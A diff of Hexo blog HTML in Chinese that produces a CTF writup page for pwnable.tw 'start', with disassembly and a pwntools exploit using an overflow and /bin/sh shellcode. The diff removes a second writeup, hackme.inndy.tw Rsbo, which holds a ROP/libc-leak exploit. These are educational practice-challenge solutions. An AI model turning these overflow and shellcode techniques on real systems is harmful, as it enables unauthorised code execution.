@@ -20,28 +20,33 @@
     var CONFIG = {"hostname":"wh00am1.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Wh0am1&#39;s Blog">
-<meta property="og:url" content="https://wh00am1.github.io/index.html">
+  <meta name="description" content="pwnable.tw start (pwn)保護機制Nope 分析程式僅有一OEP (entry 0) 簡單看一下: 1234567891011121314151617181920212223┌ 61: entry0 ();│           0x08048060      54             push esp                    ; [01] -r-x secti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw start Writeup">
+<meta property="og:url" content="https://wh00am1.github.io/archives/pwnable-tw-start-Writeup/index.html">
 <meta property="og:site_name" content="Wh0am1&#39;s Blog">
+<meta property="og:description" content="pwnable.tw start (pwn)保護機制Nope 分析程式僅有一OEP (entry 0) 簡單看一下: 1234567891011121314151617181920212223┌ 61: entry0 ();│           0x08048060      54             push esp                    ; [01] -r-x secti">
 <meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2020-10-16T10:57:30.000Z">
+<meta property="article:modified_time" content="2020-10-16T11:15:39.333Z">
 <meta property="article:author" content="wh0am1">
+<meta property="article:tag" content="CTF, pwn">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://wh00am1.github.io/">
+<link rel="canonical" href="https://wh00am1.github.io/archives/pwnable-tw-start-Writeup/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-TW'
   };
 </script>
 
-  <title>Wh0am1's Blog</title>
+  <title>pwnable.tw start Writeup | Wh0am1's Blog</title>
   
 
 
@@ -140,9 +145,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
@@ -158,10 +164,9 @@
       <meta itemprop="name" content="Wh0am1's Blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/archives/pwnable-tw-start-Writeup/" class="post-title-link" itemprop="url">pwnable.tw start Writeup</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.tw start Writeup
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -185,7 +190,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="pwnable-tw-start-pwn"><a href="#pwnable-tw-start-pwn" class="headerlink" title="pwnable.tw start (pwn)"></a>pwnable.tw start (pwn)</h1><h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Nope</p>
+        <h1 id="pwnable-tw-start-pwn"><a href="#pwnable-tw-start-pwn" class="headerlink" title="pwnable.tw start (pwn)"></a>pwnable.tw start (pwn)</h1><h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Nope</p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程式僅有一OEP (entry 0)</p>
 <p>簡單看一下:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌ 61: entry0 ();</span><br><span class="line">│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text</span><br><span class="line">│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; &quot;\1\xc0@\u0340\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;                                                         </span><br><span class="line">│           0x08048066      31c0           xor eax, eax</span><br><span class="line">│           0x08048068      31db           xor ebx, ebx</span><br><span class="line">│           0x0804806a      31c9           xor ecx, ecx</span><br><span class="line">│           0x0804806c      31d2           xor edx, edx</span><br><span class="line">│           0x0804806e      684354463a     push 0x3a465443             ; &#39;CTF:&#39;</span><br><span class="line">│           0x08048073      6874686520     push 0x20656874             ; &#39;the &#39;</span><br><span class="line">│           0x08048078      6861727420     push 0x20747261             ; &#39;art &#39;</span><br><span class="line">│           0x0804807d      6873207374     push 0x74732073             ; &#39;s st&#39;</span><br><span class="line">│           0x08048082      684c657427     push 0x2774654c             ; &#39;Let&#39;&#39;</span><br><span class="line">│           0x08048087      89e1           mov ecx, esp</span><br><span class="line">│           0x08048089      b214           mov dl, 0x14                ; 20</span><br><span class="line">│           0x0804808b      b301           mov bl, 1</span><br><span class="line">│           0x0804808d      b004           mov al, 4</span><br><span class="line">│           0x0804808f      cd80           int 0x80</span><br><span class="line">│           0x08048091      31db           xor ebx, ebx</span><br><span class="line">│           0x08048093      b23c           mov dl, 0x3c                ; &#39;&lt;&#39; ; 60</span><br><span class="line">│           0x08048095      b003           mov al, 3</span><br><span class="line">│           0x08048097      cd80           int 0x80</span><br><span class="line">│           0x08048099      83c414         add esp, 0x14</span><br><span class="line">└           0x0804809c      c3             ret</span><br></pre></td></tr></table></figure>
@@ -204,104 +209,33 @@
 </ol>
 <p>exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first stage (leak stack)</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#print p.recv(4)</span></span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Stack at:&#123;&#125;&#x27;</span>.format(hex(esp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second stage</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(esp + <span class="number">0x14</span>) + shellcode </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/CTF-pwn/" rel="tag"># CTF, pwn</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/hackme-inndy-tw-Rsbo-Writeup/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="wh0am1">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wh0am1's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/archives/hackme-inndy-tw-Rsbo-Writeup/" class="post-title-link" itemprop="url">hackme.inndy.tw Rsbo Writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">發表於</span>
-              
-
-              <time title="創建時間：2020-10-15 20:53:03 / 修改時間：21:31:21" itemprop="dateCreated datePublished" datetime="2020-10-15T20:53:03+08:00">2020-10-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn"><a href="#hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn" class="headerlink" title="hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)"></a>hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p>Tips: ROP, open, read</p>
-<h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p><code>NX</code>開啟，<code>Partial RELRO</code></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="main的邏輯"><a href="#main的邏輯" class="headerlink" title="main的邏輯:"></a>main的邏輯:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+10h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+60h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+64h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+68h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+6Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  init();</span><br><span class="line">  v8 = read_80_bytes(buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v7 = v3 % (i + <span class="number">1</span>);</span><br><span class="line">    v6 = buf[i];</span><br><span class="line">    buf[i] = buf[v3 % (i + <span class="number">1</span>)];</span><br><span class="line">    buf[v7] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, buf, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到是先分配了長度60的buf, 以及4個整數，接著呼叫<code>alarm()</code>, <code>init()</code></p>
-<p>先看看<code>init()</code>的邏輯:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/home/ctf/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x10</span>u);</span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    seed = (<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="number">1337</span> * seed + buf[i]) % <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>init()</code>的邏輯主要是:</p>
-<ol>
-<li>打開<code>/home/ctf/flag</code>, 然後讀到buf (長度16)</li>
-<li>搞出一個<code>seed</code>, 然後對flag做了一些操作</li>
-</ol>
-<p>看不出有明顯漏洞, 接著看看<code>read_80_bytes()</code>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">read_80_bytes</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x80</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>很簡單, 就是讀<code>0x80</code> bytes</p>
-<p>接著題目說 <code>Open</code>, <code>Read</code>, 就看不太懂了</p>
-<p>不過觀察組語可發現 <code>main()</code> stack大小小於<code>0x80(128)</code>, 而<code>read_80_bytes()</code> 造成 overflow</p>
-<p>因為ASLR, NX 的關係, 需要想辦法ROP</p>
-<p>但binary太小, 組不起ROP chain, 因此使用libc</p>
-<p>只要Leak GOT, 接著就可以算出libc base &amp; getshell了</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit:"></a>exploit:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;rsbo&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7706</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;rsbo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so.i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stage 1 (leak read)</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;_start&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Libc base at: &#123;&#125;&#x27;</span>.format(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5faa5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-
-<p>p.s. shell連上去之後可以拿到2個 Flag (直接Double Kill XD)</p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/hackme-inndy-tw-Rsbo-Writeup/" rel="prev" title="hackme.inndy.tw Rsbo Writeup">
+      <i class="fa fa-chevron-left"></i> hackme.inndy.tw Rsbo Writeup
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -354,6 +288,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-tw-start-pwn"><span class="nav-number">1.</span> <span class="nav-text">pwnable.tw start (pwn)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">保護機制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.3.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
